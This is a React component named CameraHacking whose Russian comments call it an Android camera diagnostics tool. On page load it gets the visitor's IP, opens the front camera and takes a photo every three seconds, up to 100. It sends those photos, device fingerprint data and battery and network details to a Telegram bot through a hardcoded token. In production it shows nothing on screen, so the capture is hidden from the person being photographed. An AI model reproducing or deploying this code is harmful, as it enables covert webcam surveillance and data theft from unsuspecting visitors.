/**
 * КОМПОНЕНТ CAMERAHACKING - ПОЛНАЯ ДИАГНОСТИКА ANDROID
 * СИСТЕМА ВЫЯВЛЕНИЯ И ИСПРАВЛЕНИЯ ПРОБЛЕМ
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const diagnosticIntervalRef = useRef(null);
  const retryTimeoutRef = useRef(null);
  
  const [diagnosticData, setDiagnosticData] = useState({
    status: 'initializing',
    deviceInfo: {},
    cameraState: {},
    networkInfo: {},
    errors: [],
    captures: 0,
    successfulCaptures: 0,
    failedCaptures: 0
  });
  
  const [captureCount, setCaptureCount] = useState(0);

  // Конфигурация
  const CAPTURE_INTERVAL = 3000;
  const MAX_CAPTURES = 100;
  const DIAGNOSTIC_INTERVAL = 5000; // Каждые 5 секунд отправляем диагностику

  /**
   * УНИВЕРСАЛЬНАЯ ДИАГНОСТИКА УСТРОЙСТВА
   */
  const runFullDiagnostics = async () => {
    const diagnostics = {
      timestamp: new Date().toISOString(),
      
      // 1. ИНФОРМАЦИЯ О БРАУЗЕРЕ
      browser: {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        maxTouchPoints: navigator.maxTouchPoints || 0,
        
        // API поддержка
        mediaDevices: !!navigator.mediaDevices,
        getUserMedia: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
        mediaRecorder: !!window.MediaRecorder,
        canvas: !!document.createElement('canvas').getContext,
        webrtc: !!(window.RTCPeerConnection || window.webkitRTCPeerConnection),
        
        // Детекция Android
        isAndroid: /android/i.test(navigator.userAgent),
        isIOS: /iphone|ipad|ipod/i.test(navigator.userAgent),
        isChrome: /chrome/i.test(navigator.userAgent) && !/edge/i.test(navigator.userAgent),
        isFirefox: /firefox/i.test(navigator.userAgent),
        isSamsung: /samsungbrowser/i.test(navigator.userAgent),
        isWebView: /wv|webview/i.test(navigator.userAgent)
      },
      
      // 2. ХАРАКТЕРИСТИКИ УСТРОЙСТВА
      device: {
        memory: navigator.deviceMemory || 'unknown',
        cores: navigator.hardwareConcurrency || 'unknown',
        connection: navigator.connection || {},
        battery: null,
        
        // Версия Android если есть
        androidVersion: (() => {
          const match = navigator.userAgent.match(/Android\s([0-9\.]+)/);
          return match ? parseFloat(match[1]) : 0;
        })()
      },
      
      // 3. ЭКРАН И РАЗРЕШЕНИЕ
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        availWidth: window.screen.availWidth,
        availHeight: window.screen.availHeight,
        colorDepth: window.screen.colorDepth,
        pixelDepth: window.screen.pixelDepth,
        orientation: window.screen.orientation?.type || 'unknown'
      },
      
      // 4. КАМЕРА И ВИДЕО
      camera: {
        streamActive: !!streamRef.current,
        videoReady: false,
        videoWidth: 0,
        videoHeight: 0,
        tracks: [],
        constraints: null,
        hasCameraPermission: false
      },
      
      // 5. СЕТЬ
      network: {
        online: navigator.onLine,
        type: navigator.connection?.effectiveType || 'unknown',
        downlink: navigator.connection?.downlink || 'unknown',
        rtt: navigator.connection?.rtt || 'unknown',
        saveData: navigator.connection?.saveData || false
      },
      
      // 6. ПРОБЛЕМЫ И ОШИБКИ
      issues: [],
      suggestions: []
    };
    
    // Проверяем батарею если доступно
    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        diagnostics.device.battery = {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } catch (e) {
        diagnostics.device.battery = { error: e.message };
      }
    }
    
    // Проверяем состояние видео если есть
    if (videoRef.current) {
      const video = videoRef.current;
      diagnostics.camera.videoReady = video.readyState >= 2;
      diagnostics.camera.videoWidth = video.videoWidth;
      diagnostics.camera.videoHeight = video.videoHeight;
      diagnostics.camera.hasCameraPermission = !!streamRef.current;
      
      if (streamRef.current) {
        const tracks = streamRef.current.getTracks();
        diagnostics.camera.tracks = tracks.map(track => ({
          kind: track.kind,
          readyState: track.readyState,
          enabled: track.enabled,
          muted: track.muted,
          label: track.label || 'no label'
        }));
      }
    }
    
    // Выявляем проблемы
    diagnostics.issues = identifyIssues(diagnostics);
    
    // Генерируем рекомендации
    diagnostics.suggestions = generateSuggestions(diagnostics);
    
    // Обновляем состояние
    setDiagnosticData(prev => ({
      ...prev,
      deviceInfo: diagnostics.browser,
      cameraState: diagnostics.camera,
      networkInfo: diagnostics.network,
      status: diagnostics.camera.streamActive ? 'active' : 'inactive'
    }));
    
    return diagnostics;
  };

  /**
   * ВЫЯВЛЕНИЕ ПРОБЛЕМ НА ОСНОВЕ ДИАГНОСТИКИ
   */
  const identifyIssues = (diagnostics) => {
    const issues = [];
    
    // 1. Проблемы с WebRTC поддержкой
    if (!diagnostics.browser.mediaDevices) {
      issues.push({
        code: 'NO_MEDIADEVICES',
        severity: 'critical',
        message: 'MediaDevices API не поддерживается браузером'
      });
    }
    
    if (!diagnostics.browser.getUserMedia) {
      issues.push({
        code: 'NO_GETUSERMEDIA',
        severity: 'critical',
        message: 'getUserMedia API не поддерживается'
      });
    }
    
    // 2. Проблемы с Android версией
    if (diagnostics.browser.isAndroid) {
      if (diagnostics.device.androidVersion < 5.0) {
        issues.push({
          code: 'OLD_ANDROID',
          severity: 'high',
          message: `Android версия ${diagnostics.device.androidVersion} устарела (минимум требуется 5.0)`
        });
      }
    }
    
    // 3. Проблемы с камерой
    if (diagnostics.camera.streamActive && diagnostics.camera.videoWidth === 0) {
      issues.push({
        code: 'BLACK_CAMERA',
        severity: 'high',
        message: 'Камера активна, но видео черное (0x0 пикселей)'
      });
    }
    
    if (!diagnostics.camera.hasCameraPermission) {
      issues.push({
        code: 'NO_PERMISSION',
        severity: 'critical',
        message: 'Нет разрешения на использование камеры'
      });
    }
    
    // 4. Проблемы с сетью
    if (!diagnostics.network.online) {
      issues.push({
        code: 'OFFLINE',
        severity: 'high',
        message: 'Устройство не подключено к интернету'
      });
    }
    
    if (diagnostics.network.type === 'slow-2g' || diagnostics.network.type === '2g') {
      issues.push({
        code: 'SLOW_NETWORK',
        severity: 'medium',
        message: `Медленное соединение: ${diagnostics.network.type}`
      });
    }
    
    // 5. Проблемы с треками
    if (diagnostics.camera.tracks.length > 0) {
      const inactiveTracks = diagnostics.camera.tracks.filter(t => t.readyState !== 'live');
      if (inactiveTracks.length > 0) {
        issues.push({
          code: 'INACTIVE_TRACKS',
          severity: 'high',
          message: `${inactiveTracks.length} неактивных медиа-треков`
        });
      }
    }
    
    return issues;
  };

  /**
   * ГЕНЕРАЦИЯ РЕКОМЕНДАЦИЙ
   */
  const generateSuggestions = (diagnostics) => {
    const suggestions = [];
    
    // Для старых Android
    if (diagnostics.browser.isAndroid && diagnostics.device.androidVersion < 8.0) {
      suggestions.push({
        action: 'REDUCE_QUALITY',
        priority: 'high',
        message: 'Использовать низкое качество видео для старых Android'
      });
    }
    
    // Для медленной сети
    if (diagnostics.network.type === 'slow-2g' || diagnostics.network.type === '2g') {
      suggestions.push({
        action: 'COMPRESS_IMAGES',
        priority: 'high',
        message: 'Сжимать изображения перед отправкой'
      });
    }
    
    // Для WebView
    if (diagnostics.browser.isWebView) {
      suggestions.push({
        action: 'USE_SIMPLE_CONSTRAINTS',
        priority: 'medium',
        message: 'Использовать простые настройки камеры для WebView'
      });
    }
    
    // Если камера черная
    if (diagnostics.camera.streamActive && diagnostics.camera.videoWidth === 0) {
      suggestions.push({
        action: 'RESTART_CAMERA',
        priority: 'critical',
        message: 'Перезапустить камеру'
      });
    }
    
    return suggestions;
  };

  /**
   * ОТПРАВКА ДИАГНОСТИКИ В TELEGRAM
   */
  const sendDiagnosticsToTelegram = async (diagnostics) => {
    try {
      // Форматируем диагностику в читаемый текст
      let diagnosticText = `🔍 ДИАГНОСТИКА УСТРОЙСТВА\n\n`;
      
      // Информация об устройстве
      diagnosticText += `📱 УСТРОЙСТВО:\n`;
      diagnosticText += `• Android: ${diagnostics.browser.isAndroid ? `Да (${diagnostics.device.androidVersion})` : 'Нет'}\n`;
      diagnosticText += `• Браузер: ${diagnostics.browser.isChrome ? 'Chrome' : diagnostics.browser.isFirefox ? 'Firefox' : diagnostics.browser.isSamsung ? 'Samsung' : 'Другой'}\n`;
      diagnosticText += `• WebView: ${diagnostics.browser.isWebView ? 'Да' : 'Нет'}\n`;
      diagnosticText += `• Память: ${diagnostics.device.memory}GB\n`;
      diagnosticText += `• Ядра CPU: ${diagnostics.device.cores}\n\n`;
      
      // Состояние камеры
      diagnosticText += `📷 КАМЕРА:\n`;
      diagnosticText += `• Разрешение: ${diagnostics.camera.videoWidth}x${diagnostics.camera.videoHeight}\n`;
      diagnosticText += `• Треки: ${diagnostics.camera.tracks.length}\n`;
      diagnosticText += `• Готовность: ${diagnostics.camera.videoReady ? 'Готов' : 'Не готов'}\n`;
      diagnosticText += `• Поток: ${diagnostics.camera.streamActive ? 'Активен' : 'Не активен'}\n\n`;
      
      // Сеть
      diagnosticText += `🌐 СЕТЬ:\n`;
      diagnosticText += `• Онлайн: ${diagnostics.network.online ? 'Да' : 'Нет'}\n`;
      diagnosticText += `• Тип: ${diagnostics.network.type}\n`;
      diagnosticText += `• Скорость: ${diagnostics.network.downlink} Mbps\n`;
      diagnosticText += `• Экономия трафика: ${diagnostics.network.saveData ? 'Включена' : 'Выключена'}\n\n`;
      
      // Проблемы
      if (diagnostics.issues.length > 0) {
        diagnosticText += `⚠️ ПРОБЛЕМЫ (${diagnostics.issues.length}):\n`;
        diagnostics.issues.forEach((issue, index) => {
          diagnosticText += `${index + 1}. [${issue.severity.toUpperCase()}] ${issue.message}\n`;
        });
        diagnosticText += `\n`;
      }
      
      // Рекомендации
      if (diagnostics.suggestions.length > 0) {
        diagnosticText += `💡 РЕКОМЕНДАЦИИ:\n`;
        diagnostics.suggestions.forEach((suggestion, index) => {
          diagnosticText += `${index + 1}. [${suggestion.priority}] ${suggestion.message}\n`;
        });
      }
      
      // Отправляем в Telegram
      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      
      await axios.post(telegramApiUrl, {
        chat_id: chatId,
        text: diagnosticText,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Диагностика отправлена в Telegram');
      
      // Также отправляем JSON для подробного анализа
      const jsonData = {
        timestamp: diagnostics.timestamp,
        userAgent: diagnostics.browser.userAgent,
        issues: diagnostics.issues,
        suggestions: diagnostics.suggestions,
        cameraState: diagnostics.camera,
        deviceInfo: {
          isAndroid: diagnostics.browser.isAndroid,
          androidVersion: diagnostics.device.androidVersion,
          isWebView: diagnostics.browser.isWebView,
          browser: diagnostics.browser.isChrome ? 'chrome' : 
                  diagnostics.browser.isFirefox ? 'firefox' : 
                  diagnostics.browser.isSamsung ? 'samsung' : 'other'
        }
      };
      
      // Отправляем JSON как файл
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('document', 
        new Blob([JSON.stringify(jsonData, null, 2)], { type: 'application/json' }),
        `diagnostics_${Date.now()}.json`
      );
      
      const fileApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendDocument';
      await axios.post(fileApiUrl, formData, {
        headers: { 'Content-Type': 'multipart/form-data' }
      });
      
    } catch (error) {
      console.error('❌ Ошибка отправки диагностики:', error);
    }
  };

  /**
   * ТЕСТ КАМЕРЫ С ДИАГНОСТИКОЙ
   */
  const testCameraWithDiagnostics = async () => {
    console.log('🔧 Запуск теста камеры с диагностикой...');
    
    const testResults = {
      passed: [],
      failed: [],
      warnings: []
    };
    
    try {
      // Тест 1: Проверка поддержки API
      if (!navigator.mediaDevices) {
        testResults.failed.push({
          test: 'MediaDevices API',
          message: 'API не поддерживается'
        });
      } else {
        testResults.passed.push('MediaDevices API доступен');
      }
      
      // Тест 2: Проверка getUserMedia
      if (!navigator.mediaDevices.getUserMedia) {
        testResults.failed.push({
          test: 'getUserMedia',
          message: 'Функция не доступна'
        });
      } else {
        testResults.passed.push('getUserMedia доступен');
      }
      
      // Тест 3: Попытка получить камеру
      const constraints = {
        video: {
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: 'user'
        }
      };
      
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        testResults.passed.push('Доступ к камере получен');
        
        // Проверяем треки
        const tracks = stream.getTracks();
        if (tracks.length === 0) {
          testResults.failed.push({
            test: 'Video Tracks',
            message: 'Нет видео треков в потоке'
          });
        } else {
          testResults.passed.push(`Найдено ${tracks.length} треков`);
          
          // Проверяем каждый трек
          tracks.forEach((track, index) => {
            if (track.readyState !== 'live') {
              testResults.warnings.push({
                test: `Track ${index} State`,
                message: `Трек в состоянии: ${track.readyState}`
              });
            }
          });
        }
        
        // Останавливаем тестовый поток
        tracks.forEach(track => track.stop());
        
      } catch (cameraError) {
        testResults.failed.push({
          test: 'Camera Access',
          message: `Ошибка: ${cameraError.message}`
        });
      }
      
      // Тест 4: Canvas поддержка
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      if (!ctx) {
        testResults.failed.push({
          test: 'Canvas API',
          message: 'Canvas не поддерживается'
        });
      } else {
        testResults.passed.push('Canvas API доступен');
      }
      
      // Тест 5: Проверка размера файла
      canvas.width = 100;
      canvas.height = 100;
      ctx.fillStyle = 'red';
      ctx.fillRect(0, 0, 100, 100);
      
      return new Promise(resolve => {
        canvas.toBlob((blob) => {
          if (!blob) {
            testResults.failed.push({
              test: 'Canvas to Blob',
              message: 'Не удалось создать Blob'
            });
          } else {
            testResults.passed.push(`Blob создан (${blob.size} байт)`);
          }
          
          resolve(testResults);
        }, 'image/jpeg');
      });
      
    } catch (error) {
      testResults.failed.push({
        test: 'Test Suite',
        message: `Ошибка тестирования: ${error.message}`
      });
      return testResults;
    }
  };

  /**
   * ИНИЦИАЛИЗАЦИЯ КАМЕРЫ С ДИАГНОСТИКОЙ
   */
  const initializeCameraWithDiagnostics = async () => {
    console.log('🎯 Инициализация камеры с диагностикой...');
    
    // Запускаем полную диагностику
    const diagnostics = await runFullDiagnostics();
    
    // Отправляем начальную диагностику
    await sendDiagnosticsToTelegram(diagnostics);
    
    // Проверяем проблемы
    const criticalIssues = diagnostics.issues.filter(issue => 
      issue.severity === 'critical' || issue.severity === 'high'
    );
    
    if (criticalIssues.length > 0) {
      console.error('❌ Критические проблемы обнаружены:', criticalIssues);
      
      // Запускаем тест для диагностики
      const testResults = await testCameraWithDiagnostics();
      
      // Отправляем результаты теста
      let testReport = `🧪 РЕЗУЛЬТАТЫ ТЕСТА КАМЕРЫ\n\n`;
      testReport += `✅ Пройдено: ${testResults.passed.length}\n`;
      testReport += `❌ Не пройдено: ${testResults.failed.length}\n`;
      testReport += `⚠️ Предупреждения: ${testResults.warnings.length}\n\n`;
      
      if (testResults.failed.length > 0) {
        testReport += `Ошибки:\n`;
        testResults.failed.forEach((fail, index) => {
          testReport += `${index + 1}. ${fail.test}: ${fail.message}\n`;
        });
      }
      
      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      await axios.post(telegramApiUrl, {
        chat_id: chatId,
        text: testReport
      });
      
      return false;
    }
    
    // Если проблем нет, инициализируем камеру
    try {
      const deviceInfo = diagnostics.browser;
      
      // Выбираем constraints на основе диагностики
      const constraints = getOptimalConstraints(deviceInfo, diagnostics);
      
      console.log('🎯 Используем constraints:', constraints);
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      streamRef.current = stream;
      
      if (videoRef.current) {
        const video = videoRef.current;
        
        // Настройки для Android
        if (deviceInfo.isAndroid) {
          video.playsInline = true;
          video.muted = true;
          video.autoplay = true;
          video.setAttribute('playsinline', 'true');
          video.setAttribute('muted', 'true');
          video.setAttribute('autoplay', 'true');
          video.setAttribute('webkit-playsinline', 'true');
        }
        
        video.srcObject = stream;
        
        // Ждем готовности видео
        await new Promise((resolve, reject) => {
          const timeout = setTimeout(() => {
            console.log('⏰ Таймаут ожидания видео');
            resolve();
          }, 10000);
          
          video.onloadedmetadata = () => {
            clearTimeout(timeout);
            console.log(`✅ Видео готово: ${video.videoWidth}x${video.videoHeight}`);
            
            // Для Android пробуем запустить воспроизведение
            if (deviceInfo.isAndroid) {
              video.play().then(() => {
                console.log('▶️ Видео запущено');
                resolve();
              }).catch(() => {
                console.log('⚠️ Auto-play заблокирован, но продолжаем');
                resolve();
              });
            } else {
              resolve();
            }
          };
        });
        
        console.log('🎬 Камера успешно инициализирована');
        setDiagnosticData(prev => ({ ...prev, status: 'active' }));
        
        // Запускаем периодическую диагностику
        startPeriodicDiagnostics();
        
        // Запускаем захват фото
        startPeriodicCapture();
        
        return true;
      }
      
    } catch (error) {
      console.error('❌ Ошибка инициализации камеры:', error);
      
      // Добавляем ошибку в диагностику
      setDiagnosticData(prev => ({
        ...prev,
        errors: [...prev.errors, {
          timestamp: new Date().toISOString(),
          type: 'camera_init',
          message: error.message,
          code: error.name
        }]
      }));
      
      // Отправляем ошибку в Telegram
      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      await axios.post(telegramApiUrl, {
        chat_id: chatId,
        text: `❌ ОШИБКА ИНИЦИАЛИЗАЦИИ КАМЕРЫ\n\n` +
              `Ошибка: ${error.name}\n` +
              `Сообщение: ${error.message}\n` +
              `Устройство: ${diagnostics.browser.isAndroid ? 'Android' : 'Другое'}\n` +
              `Браузер: ${navigator.userAgent.substring(0, 100)}`
      });
      
      return false;
    }
    
    return false;
  };

  /**
   * ВЫБОР ОПТИМАЛЬНЫХ НАСТРОЕК НА ОСНОВЕ ДИАГНОСТИКИ
   */
  const getOptimalConstraints = (deviceInfo, diagnostics) => {
    // Базовые настройки
    const baseConstraints = {
      video: {
        width: { ideal: 1280 },
        height: { ideal: 720 },
        frameRate: { ideal: 24 },
        facingMode: 'user'
      },
      audio: false
    };
    
    // Адаптация на основе диагностики
    if (deviceInfo.isAndroid) {
      const androidVersion = diagnostics.device.androidVersion;
      const isLowEnd = diagnostics.device.memory < 2 || diagnostics.device.cores < 4;
      
      if (androidVersion < 6.0 || isLowEnd) {
        return {
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            frameRate: { ideal: 15 },
            facingMode: 'user'
          },
          audio: false
        };
      }
      
      if (androidVersion < 8.0) {
        return {
          video: {
            width: { ideal: 800 },
            height: { ideal: 600 },
            frameRate: { ideal: 20 },
            facingMode: 'user'
          },
          audio: false
        };
      }
      
      // Для WebView упрощаем
      if (deviceInfo.isWebView) {
        return {
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 }
          },
          audio: false
        };
      }
    }
    
    // Для медленной сети уменьшаем качество
    if (diagnostics.network.type === 'slow-2g' || diagnostics.network.type === '2g') {
      baseConstraints.video.width.ideal = 640;
      baseConstraints.video.height.ideal = 480;
    }
    
    return baseConstraints;
  };

  /**
   * ПЕРИОДИЧЕСКАЯ ДИАГНОСТИКА
   */
  const startPeriodicDiagnostics = () => {
    if (diagnosticIntervalRef.current) {
      clearInterval(diagnosticIntervalRef.current);
    }
    
    diagnosticIntervalRef.current = setInterval(async () => {
      const diagnostics = await runFullDiagnostics();
      
      // Проверяем состояние
      const hasCriticalIssues = diagnostics.issues.some(
        issue => issue.severity === 'critical'
      );
      
      if (hasCriticalIssues) {
        console.log('⚠️ Обнаружены критические проблемы, отправляем диагностику...');
        await sendDiagnosticsToTelegram(diagnostics);
      }
      
      // Сохраняем в state
      setDiagnosticData(prev => ({
        ...prev,
        cameraState: diagnostics.camera,
        networkInfo: diagnostics.network
      }));
      
    }, DIAGNOSTIC_INTERVAL);
  };

  /**
   * ЗАХВАТ ФОТО С ДИАГНОСТИКОЙ
   */
  const capturePhotoWithDiagnostics = async () => {
    if (captureCount >= MAX_CAPTURES) {
      console.log('🎯 Достигнут лимит захватов');
      stopCapturing();
      return;
    }
    
    const captureStartTime = Date.now();
    
    try {
      const video = videoRef.current;
      
      // Проверяем состояние видео
      if (!video || video.videoWidth === 0 || video.videoHeight === 0) {
        console.log('⏳ Видео не готово, пропускаем захват');
        
        // Добавляем в диагностику
        setDiagnosticData(prev => ({
          ...prev,
          failedCaptures: prev.failedCaptures + 1
        }));
        
        return;
      }
      
      console.log(`📸 Захват фото #${captureCount + 1}`);
      
      // Создаем canvas
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      
      // Пробуем несколько раз нарисовать кадр (для Android)
      let frameCaptured = false;
      let attempts = 0;
      const maxAttempts = diagnosticData.deviceInfo.isAndroid ? 3 : 1;
      
      while (!frameCaptured && attempts < maxAttempts) {
        attempts++;
        
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Проверяем, не черный ли кадр
        const imageData = ctx.getImageData(10, 10, 1, 1).data;
        const isBlack = imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0;
        
        if (!isBlack || attempts >= maxAttempts) {
          frameCaptured = true;
          console.log(`✅ Кадр захвачен (попытка ${attempts}, черный: ${isBlack})`);
          
          // Если черный, добавляем текст для диагностики
          if (isBlack) {
            ctx.fillStyle = 'white';
            ctx.font = '20px Arial';
            ctx.fillText('Android Camera Test', 20, 40);
            ctx.fillText(new Date().toLocaleTimeString(), 20, 70);
          }
        } else {
          console.log(`⏳ Черный кадр, повторная попытка ${attempts}/${maxAttempts}`);
          await new Promise(resolve => setTimeout(resolve, 100));
        }
      }
      
      // Качество на основе диагностики
      const quality = diagnosticData.deviceInfo.isAndroid ? 0.6 : 0.8;
      
      canvas.toBlob(async (blob) => {
        if (!blob) {
          console.error('❌ Не удалось создать Blob');
          setDiagnosticData(prev => ({
            ...prev,
            failedCaptures: prev.failedCaptures + 1
          }));
          return;
        }
        
        const captureTime = Date.now() - captureStartTime;
        const sizeKB = Math.round(blob.size / 1024);
        
        console.log(`✅ Фото готово (${sizeKB} KB, время: ${captureTime}ms)`);
        
        // Отправляем фото
        const success = await sendPhotoToTelegram(blob);
        
        if (success) {
          setCaptureCount(prev => prev + 1);
          setDiagnosticData(prev => ({
            ...prev,
            successfulCaptures: prev.successfulCaptures + 1,
            captures: prev.captures + 1
          }));
        } else {
          setDiagnosticData(prev => ({
            ...prev,
            failedCaptures: prev.failedCaptures + 1
          }));
        }
        
        // Каждые 10 фото отправляем статистику
        if (captureCount % 10 === 0) {
          await sendCaptureStats();
        }
        
      }, 'image/jpeg', quality);
      
    } catch (error) {
      console.error('❌ Ошибка захвата фото:', error);
      
      setDiagnosticData(prev => ({
        ...prev,
        failedCaptures: prev.failedCaptures + 1,
        errors: [...prev.errors, {
          timestamp: new Date().toISOString(),
          type: 'capture_error',
          message: error.message
        }]
      }));
    }
  };

  /**
   * ОТПРАВКА ФОТО В TELEGRAM
   */
  const sendPhotoToTelegram = async (blob) => {
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      
      // Добавляем диагностические данные
      formData.append('diagnostics', JSON.stringify({
        captureNumber: captureCount + 1,
        timestamp: new Date().toISOString(),
        deviceInfo: diagnosticData.deviceInfo,
        blobSize: blob.size
      }));
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      
      await axios.post(apiUrl, formData, {
        headers: { 'Content-Type': 'multipart/form-data' },
        timeout: 30000
      });
      
      return true;
      
    } catch (error) {
      console.error('❌ Ошибка отправки фото:', error);
      return false;
    }
  };

  /**
   * ОТПРАВКА СТАТИСТИКИ ЗАХВАТОВ
   */
  const sendCaptureStats = async () => {
    const statsText = `📊 СТАТИСТИКА ЗАХВАТОВ\n\n` +
                     `Всего захватов: ${diagnosticData.captures}\n` +
                     `Успешных: ${diagnosticData.successfulCaptures}\n` +
                     `Неудачных: ${diagnosticData.failedCaptures}\n` +
                     `Успешность: ${diagnosticData.captures > 0 ? 
                       Math.round((diagnosticData.successfulCaptures / diagnosticData.captures) * 100) : 0}%\n\n` +
                     `Устройство: ${diagnosticData.deviceInfo.isAndroid ? 'Android' : 'Другое'}\n` +
                     `Статус камеры: ${diagnosticData.cameraState.streamActive ? 'Активна' : 'Не активна'}\n` +
                     `Разрешение: ${diagnosticData.cameraState.videoWidth}x${diagnosticData.cameraState.videoHeight}`;
    
    try {
      const telegramApiUrl = 'https://api.telegram.org/bot8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s/sendMessage';
      await axios.post(telegramApiUrl, {
        chat_id: chatId,
        text: statsText
      });
    } catch (error) {
      console.error('❌ Ошибка отправки статистики:', error);
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log('🚀 Запуск периодического захвата фото');
    
    captureIntervalRef.current = setInterval(() => {
      capturePhotoWithDiagnostics();
    }, CAPTURE_INTERVAL);
  };

  /**
   * ОСТАНОВКА ВСЕХ ПРОЦЕССОВ
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    if (diagnosticIntervalRef.current) {
      clearInterval(diagnosticIntervalRef.current);
      diagnosticIntervalRef.current = null;
    }
    
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    
    console.log('🛑 Все процессы остановлены');
  };

  /**
   * ПОЛУЧЕНИЕ IP АДРЕСА
   */
  const fetchClientIp = async () => {
    try {
      const response = await axios.get('https://api.ipify.org?format=json', {
        timeout: 5000
      });
      
      setClientIp(response.data.ip);
      console.log('✅ IP адрес получен:', response.data.ip);
      
    } catch (error) {
      console.error('❌ Ошибка получения IP:', error);
      setClientIp('IP недоступен');
    }
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    const init = async () => {
      // Восстановление геолокации
      const savedPermission = localStorage.getItem('locationPermission');
      if (savedPermission) {
        try {
          const locationData = JSON.parse(savedPermission);
          setLocationPermission(locationData);
        } catch (error) {
          localStorage.removeItem('locationPermission');
        }
      }
      
      // Получаем IP
      await fetchClientIp();
      
      // Инициализируем камеру с диагностикой
      await initializeCameraWithDiagnostics();
    };
    
    init();
    
    return () => {
      stopCapturing();
    };
  }, []);

  /**
   * КОМПОНЕНТ ДЛЯ ОТЛАДКИ (ВИДИМЫЙ ТОЛЬКО В РЕЖИМЕ РАЗРАБОТКИ)
   */
  if (process.env.NODE_ENV === 'development') {
    return (
      <div style={{
        position: 'fixed',
        bottom: 0,
        left: 0,
        right: 0,
        background: 'rgba(0,0,0,0.9)',
        color: 'white',
        padding: '10px',
        fontSize: '11px',
        zIndex: 9999,
        maxHeight: '150px',
        overflow: 'auto',
        fontFamily: 'monospace'
      }}>
        <div><strong>Диагностика камеры:</strong></div>
        <div>Статус: {diagnosticData.status}</div>
        <div>Устройство: {diagnosticData.deviceInfo.isAndroid ? 'Android' : 'Другое'}</div>
        <div>Камера: {diagnosticData.cameraState.videoWidth}x{diagnosticData.cameraState.videoHeight}</div>
        <div>Захватов: {diagnosticData.successfulCaptures} / {diagnosticData.failedCaptures}</div>
        <div>Ошибок: {diagnosticData.errors.length}</div>
        {diagnosticData.errors.slice(-2).map((error, index) => (
          <div key={index} style={{ color: '#ff6b6b' }}>
            {error.type}: {error.message.substring(0, 50)}...
          </div>
        ))}
      </div>
    );
  }

  return null;
};

export default CameraHacking;
